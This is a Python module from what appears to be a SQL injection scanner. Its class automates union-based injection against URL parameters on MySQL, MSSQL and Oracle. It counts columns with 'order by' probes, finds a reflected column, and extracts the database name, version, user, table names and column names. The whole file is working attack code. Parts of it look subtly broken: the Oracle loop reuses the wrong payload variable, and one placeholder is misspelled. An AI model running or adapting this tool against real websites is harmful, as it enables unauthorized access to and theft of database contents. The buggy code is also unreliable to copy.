from lib.core.settings import BOUNDARIES_FILE_NAME
from lib.core.settings import DATA_FILE_NAME
from data.json_file import get_json
import random
import string

class CheckUnion():
    def __init__(self, urls, id, db, log):
        self.boundaries = get_json(BOUNDARIES_FILE_NAME, "low")
        self.urls = urls
        self.id = id
        self.log = log
        self.param = self.urls.params[id]
        self.db = db
        self.top_boundaries = []
        self.data_payloads = get_json(DATA_FILE_NAME, self.db)

    def start_stop_add(self, payload):
        '''
            拼接payload的开头和结尾
            :param payload:
            :return:返回拼接后的payload和start,stop标志
        ''' 
        # mysql(oracle只能拼接两个,暂时不用)用concat,mssql用+,oracle用||
        start = ''.join(random.sample(string.ascii_letters + string.digits, 3))
        stop = ''.join(random.sample(string.ascii_letters + string.digits, 3))
        if self.db == "mssql":
            payload = "'"+start+"'%2b"+payload+"%2b'"+stop+"'"     
        elif self.db == "oracle":
            payload = "'"+start+"'||"+payload+"||'"+stop+"'"   
        else:
            payload = "concat('"+start+"',"+payload+",'"+stop+"')"
        return payload,start,stop

    def check_order_by(self):
        '''
            检测列数根据布尔回显或者报错语句检测
            returns: bool
        '''
        # param = self.urls.params[id]
        # 只用1和1234检测
        payload1 = {
            'payload': 'order by 1'
        }
        payload2 = {
            'payload': 'order by 1234'
        }
        
        # 若p1真,p2假,则可能存在注入
        url_list = self.urls.http_request_payload(self.param, self.boundaries, payload1)
        url_list2 = self.urls.http_request_payload(self.param, self.boundaries, payload2)
        for i in range(len(url_list)):
            # p1真则判断p2
            if self.urls.check_url_page(self.id, url_list[i]):
                for url in url_list2:
                    if not self.urls.check_url_page(self.id, url):
                        self.top_boundaries.append(self.boundaries[i])
                        return True

    def get_columns(self):
        '''
            order by 1到30
            返回列数
        '''
        for i in range(1,30):
            # 前真后假则前为列数
            payload = {
                'payload': 'order by %s' %i
            }
            url = self.urls.http_request_payload(self.param, self.top_boundaries, payload)[0]
            bool_result = self.urls.check_url_page(self.id, url)
            if not bool_result:
                return i-1
    def replace_null(self, is_num, payload):
        '''
            修改union查询里的null为随机数字或字符
            returns: url和随机数和新的payload
        '''
        # 类型要么数字要么字符
        if is_num:
            rand = str(random.randint(1000,9999))
        else:
            rand = "'" +''.join(random.sample(string.ascii_letters + string.digits, 4)) + "'"
        payload = payload.replace("NULL", rand, 1)
        payload_dict = {"payload": payload}
        return self.urls.http_request_payload(self.param, self.top_boundaries, payload_dict)[0], rand, payload

    def get_column_list(self, columns):
        '''
            MYSQL一次就行,
            MSSQL和ORACLE需要判断类型,需要循环遍历
            返回可以注入的列,可替换字符,和payload
        '''
        # 初始化payload,oracle的要加dual表名
        if self.db == "oracle":
            payload = 'and 1=0 union select {}NULL from dual'.format("NULL,"*(columns-1))
        else:
            payload = 'and 1=0 union select {}NULL'.format("NULL,"*(columns-1))

        if self.db == "mysql":
            # mysql不用判断类型,所以只替换成字符就好
            for i in range(columns):
                url, rand, new_payload = self.replace_null(False, payload)
                if self.urls.check_keyword(url, rand.replace("'", ""), False):
                    return i + 1, rand, new_payload
                else:
                    payload = new_payload
        else:
            for i in range(columns):
                # 先替换成数字
                url, rand, new_payload = self.replace_null(True, payload)
                # 判断是否有回显,有则直接返回该列数
                if self.urls.check_keyword(url, rand, False):
                    return i + 1, rand, new_payload
                # 判断是否报错,无报错payload更新一下
                if self.urls.check_url_page(self.id, url):
                    payload =  new_payload
                # 有则改变类型
                else:
                    # 替换成字符
                    url, rand, new_payload = self.replace_null(False, payload)
                    if self.urls.check_keyword(url, rand.replace("'", ""), False):
                        return i + 1, rand, new_payload
                    else:
                        payload =  new_payload
        return False, False, False

    def payload_handle(self, payload, start, stop):
        '''
            封装一下重复函数
            returns result
        '''
        # 整理payload
        payload_dict = {
            "payload": payload
        }
        url = self.urls.http_request_payload(self.param, self.top_boundaries, payload_dict)[0]
        result = self.urls.check_keyword(url, start+'(.*?)'+stop, False)
        return result

    def show_oracle_data(self, payload, rand, db_name="", table_name=""):
        '''
            由于oracle比较特殊,因此需要单独封装
            returns: []
        '''
        table_list = []
        column_list = []
        # 获取某个库的所有表名
        if table_name == "":
            # 获取表数量
            table_count_payload = self.data_payloads["table_count"]
            table_count_payload, start, stop = self.start_stop_add(table_count_payload)
            table_count_payload = payload.replace(rand, table_count_payload)
            table_count = int(self.payload_handle(table_count_payload, start, stop)[0])
            # 依次获取表名
            last_table_name = ""
            for i in range(table_count):
                table_payload = self.data_payloads["table_name"]
                table_payload, start, stop = self.start_stop_add(table_payload)
                table_payload = payload.replace(rand, table_count_payload).replace('[LAST_TABLE_NAME]', last_table_name)
                last_table_name = self.payload_handle(table_payload, start, stop)[0]
                table_list.append(last_table_name)
            return table_list
        # 获取某个表的所有字段名
        else:
            # 获取字段数量
            column_count_payload = self.data_payloads["table_count"]
            column_count_payload, start, stop = self.start_stop_add(column_count_payload)
            column_count_payload = payload.replace(rand, column_count_payload)
            column_count = int(self.payload_handle(column_count_payload, start, stop)[0])
            # 依次获取表名
            last_column_name = ""
            for i in range(column_count):
                column_payload = self.data_payloads["column_name"]
                column_payload, start, stop = self.start_stop_add(column_payload)
                column_payload = payload.replace(rand, column_payload).replace('[LAST_COLUMN_NAME]', last_column_name).replace('[TABLE_NAME]',table_name)
                last_column_name = self.payload_handle(column_payload, start, stop)[0]
                column_list.append(last_column_name)
            return column_list
                    
    def show_basic_data(self, payload, rand, data_type, db_name ="", table_name=""):
        '''
            返回数据库版本号,用户,数据库名
            返回某个数据库的表名,某个表的字段名
            returns: []
        '''
        # 爆出所有表名
        if data_type == 'tables':
            if self.db == "oracle":
                return self.show_oracle_data(payload, rand, db_name, table_name)
            else:
                db_name_payload = self.data_payloads["all_table_name"]
                db_name_payload, start, stop = self.start_stop_add(db_name_payload)
                payload = payload.replace(rand, db_name_payload).replace("[DB_MAME]",db_name).replace("[TABLE_NAME]",table_name)
        # 爆普通数据
        else:
            db_name_payload = self.data_payloads[data_type]
            db_name_payload, start, stop = self.start_stop_add(db_name_payload)
            payload = payload.replace(rand, db_name_payload)
        # 整理payload
        return self.payload_handle(payload, start, stop)

    def detected(self):
        '''
            主函数
        '''
        if self.check_order_by():
            # 获取总列数
            columns = self.get_columns()
            # 获取可注数据的列
            column_list, rand, payload = self.get_column_list(columns)
            if payload:
                self.log.debug("检测出注入类型为联合注入,检测结果如下:")
                self.log.debug("爆出的数据库名为:%s" %self.show_basic_data(payload, rand, "db_name")[0])
                self.log.debug("爆出的数据库版本号为:%s" %self.show_basic_data(payload, rand, "db_version")[0])
                self.log.debug("爆出的数据库用户名为:%s" %self.show_basic_data(payload, rand, "user_name")[0])
                self.log.warning("检测完毕")
                return True
        return False
        
